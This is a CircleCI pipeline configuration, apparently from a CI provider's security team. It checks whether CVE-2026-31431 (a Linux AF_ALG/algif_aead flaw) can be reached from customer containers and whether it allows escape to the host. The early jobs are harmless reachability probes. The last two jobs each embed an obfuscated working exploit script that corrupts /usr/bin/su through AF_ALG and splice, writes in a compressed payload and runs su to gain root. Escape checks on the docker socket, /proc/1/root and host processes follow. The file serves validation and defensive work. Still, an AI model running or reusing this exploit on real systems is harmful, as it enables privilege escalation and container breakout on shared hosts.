version: 2.1

orbs:
  welcome: circleci/welcome-orb@0.4.1

jobs:
  multiple_containers:
    docker:
      - image: cimg/base:stable
      - image: redis:8.6
    parallelism: 10
    steps:
      - run: |
          echo "waiting for 30 seconds so you can see the container running"
          sleep 30
          echo "test"

  # CVE-2026-31431 surface check: probes whether socket(AF_ALG, ...) and
  # bind to algif_aead succeed from inside a customer container on a Nomad
  # worker. Job fails (exit 1) if the surface is reachable.
  af_alg_surface_default_seccomp:
    docker:
      - image: cimg/base:stable
    steps:
      - run:
          name: Host kernel
          command: uname -a
      - run:
          name: Probe AF_ALG under default Docker seccomp
          command: |
            python3 - \<<'PY'
            import socket, sys
            AF_ALG = getattr(socket, "AF_ALG", 38)
            print(f"AF_ALG constant: {AF_ALG}")
            try:
                s = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
            except PermissionError as e:
                print(f"socket(AF_ALG) BLOCKED by seccomp: {e}")
                print("RESULT: not reachable under default seccomp")
                sys.exit(0)
            except OSError as e:
                print(f"socket(AF_ALG) OSError({e.errno}): {e}")
                sys.exit(0)
            print(f"socket(AF_ALG) PERMITTED, fd={s.fileno()}")
            try:
                s.bind(("aead", "gcm(aes)"))
                print("bind(aead, gcm(aes)) OK -- algif_aead reachable")
                print("RESULT: SURFACE OPEN. CVE-2026-31431 syscall path reachable from primary container.")
                sys.exit(1)
            except OSError as e:
                print(f"bind(aead, gcm(aes)) OSError({e.errno}): {e}")
                print("RESULT: AF_ALG permitted but algif_aead bind failed (module unavailable or filtered)")
                sys.exit(1)
            finally:
                s.close()
            PY

  # Same probe, but with setup_remote_docker which causes the primary
  # container to run with seccomp=unconfined per docker-provisioner.
  af_alg_surface_remote_docker:
    docker:
      - image: cimg/base:stable
    steps:
      - setup_remote_docker
      - run:
          name: Host kernel
          command: uname -a
      - run:
          name: Probe AF_ALG under seccomp=unconfined (remote-docker path)
          command: |
            python3 - \<<'PY'
            import socket, sys
            AF_ALG = getattr(socket, "AF_ALG", 38)
            print(f"AF_ALG constant: {AF_ALG}")
            try:
                s = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
            except PermissionError as e:
                print(f"socket(AF_ALG) BLOCKED: {e}")
                print("RESULT: not reachable under unconfined")
                sys.exit(0)
            except OSError as e:
                print(f"socket(AF_ALG) OSError({e.errno}): {e}")
                sys.exit(0)
            print(f"socket(AF_ALG) PERMITTED, fd={s.fileno()}")
            try:
                s.bind(("aead", "gcm(aes)"))
                print("bind(aead, gcm(aes)) OK -- algif_aead reachable")
                print("RESULT: SURFACE OPEN via remote-docker unconfined path.")
                sys.exit(1)
            except OSError as e:
                print(f"bind(aead, gcm(aes)) OSError({e.errno}): {e}")
                sys.exit(1)
            finally:
                s.close()
            PY

  # Post-exploit validation: confirms whether CVE-2026-31431 results in a
  # full container escape (host root) or stays contained (container root).
  # Replace ~/test.py with the actual exploit script path before running.
  af_alg_escape_validation_remote_docker:
    docker:
      - image: cimg/base:stable
    steps:
      - setup_remote_docker
      - run:
          name: Creating Script
          command: |
            cat > ~/test.py \<< EOF
            #!/usr/bin/env python3
            import os as g,zlib,socket as s,ctypes as _ct
            _lc=_ct.CDLL(None)
            def _sp(fi,fo,n,offset_src=None):p=_ct.byref(_ct.c_int64(offset_src)) if offset_src is not None else None;return _lc.splice(fi,p,fo,None,n,0)
            def d(x):return bytes.fromhex(x)
            def c(f,t,c):
             a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=_sp;n(f,w,o,offset_src=0);n(r,u.fileno(),o)
             try:u.recv(8+t)
             except:0
            f=g.open("/usr/bin/su",0);i=0;e=zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
            while i<len(e):c(f,i,e[i:i+4]);i+=4
            g.system("su")
            EOF
      - run:
          name: "Test 1A: Write marker via exploit"
          command: |
            python3 ~/test.py
            touch /tmp/host_root_marker_$(date +%s)
            echo "exploit_completed" > /some/host/path
      - run:
          name: "Test 1B: Check marker persistence (host root = persists, container root = gone)"
          command: |
            ls -la /tmp/host_root_marker_* 2>/dev/null || echo "NO_PERSISTENCE"
            cat /some/host/path 2>/dev/null || echo "NO_HOST_ACCESS"
      - run:
          name: "Test 2: Process visibility (host root = sees nomad/docker/systemd)"
          command: |
            python3 ~/test.py
            echo "=== Process tree ==="
            ps auxf | head -50
            echo "=== Looking for host processes ==="
            ps aux | grep -E "(nomad|docker|systemd)" | grep -v grep
      - run:
          name: "Test 3: Mount namespace inspection (host root = host mounts, /proc/1/root accessible)"
          command: |
            python3 ~/test.py
            echo "=== Mount points ==="
            mount | head -20
            echo "=== Root filesystem ==="
            ls -la /proc/1/root/ 2>/dev/null | head -10 || echo "NO_HOST_ROOT_ACCESS"
      - run:
          name: "Test 4: Container runtime access (host root = docker socket accessible)"
          command: |
            python3 ~/test.py
            echo "=== Docker socket ==="
            ls -la /var/run/docker.sock 2>/dev/null || echo "NO_DOCKER_SOCKET"
            docker ps 2>/dev/null || echo "NO_DOCKER_ACCESS"
            echo "=== Container processes ==="
            cat /proc/*/comm 2>/dev/null | grep -E "runc|containerd" || echo "NO_RUNTIME_PROCS"
      - run:
          name: "Test 5: Network interface scope (host root = host interfaces visible)"
          command: |
            python3 ~/test.py
            echo "=== Network interfaces ==="
            ip addr show
            echo "=== Host networking ==="
            netstat -tlnp 2>/dev/null | grep -v 127.0.0.1 || echo "NO_HOST_NETSTAT"

  af_alg_escape_validation_nomad_docker:
    docker:
      - image: cimg/base:stable
    steps:
      - run:
          name: Creating Script
          command: |
            cat > ~/test.py \<< EOF
            #!/usr/bin/env python3
            import os as g,zlib,socket as s,ctypes as _ct
            _lc=_ct.CDLL(None)
            def _sp(fi,fo,n,offset_src=None):p=_ct.byref(_ct.c_int64(offset_src)) if offset_src is not None else None;return _lc.splice(fi,p,fo,None,n,0)
            def d(x):return bytes.fromhex(x)
            def c(f,t,c):
             a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=_sp;n(f,w,o,offset_src=0);n(r,u.fileno(),o)
             try:u.recv(8+t)
             except:0
            f=g.open("/usr/bin/su",0);i=0;e=zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
            while i<len(e):c(f,i,e[i:i+4]);i+=4
            g.system("su")
            EOF
      - run:
          name: "Test 1A: Write marker via exploit"
          command: |
            python3 ~/test.py
            touch /tmp/host_root_marker_$(date +%s)
            echo "exploit_completed" > /some/host/path
      - run:
          name: "Test 1B: Check marker persistence (host root = persists, container root = gone)"
          command: |
            ls -la /tmp/host_root_marker_* 2>/dev/null || echo "NO_PERSISTENCE"
            cat /some/host/path 2>/dev/null || echo "NO_HOST_ACCESS"
      - run:
          name: "Test 2: Process visibility (host root = sees nomad/docker/systemd)"
          command: |
            python3 ~/test.py
            echo "=== Process tree ==="
            ps auxf | head -50
            echo "=== Looking for host processes ==="
            ps aux | grep -E "(nomad|docker|systemd)" | grep -v grep
      - run:
          name: "Test 3: Mount namespace inspection (host root = host mounts, /proc/1/root accessible)"
          command: |
            python3 ~/test.py
            echo "=== Mount points ==="
            mount | head -20
            echo "=== Root filesystem ==="
            ls -la /proc/1/root/ 2>/dev/null | head -10 || echo "NO_HOST_ROOT_ACCESS"
      - run:
          name: "Test 4: Container runtime access (host root = docker socket accessible)"
          command: |
            python3 ~/test.py
            echo "=== Docker socket ==="
            ls -la /var/run/docker.sock 2>/dev/null || echo "NO_DOCKER_SOCKET"
            docker ps 2>/dev/null || echo "NO_DOCKER_ACCESS"
            echo "=== Container processes ==="
            cat /proc/*/comm 2>/dev/null | grep -E "runc|containerd" || echo "NO_RUNTIME_PROCS"
      - run:
          name: "Test 5: Network interface scope (host root = host interfaces visible)"
          command: |
            python3 ~/test.py
            echo "=== Network interfaces ==="
            ip addr show
            echo "=== Host networking ==="
            netstat -tlnp 2>/dev/null | grep -v 127.0.0.1 || echo "NO_HOST_NETSTAT"



workflows:
  welcome:
    jobs:
      - welcome/run
      - multiple_containers
      - af_alg_surface_default_seccomp
      - af_alg_surface_remote_docker
      - af_alg_escape_validation_remote_docker
      - af_alg_escape_validation_nomad_docker      
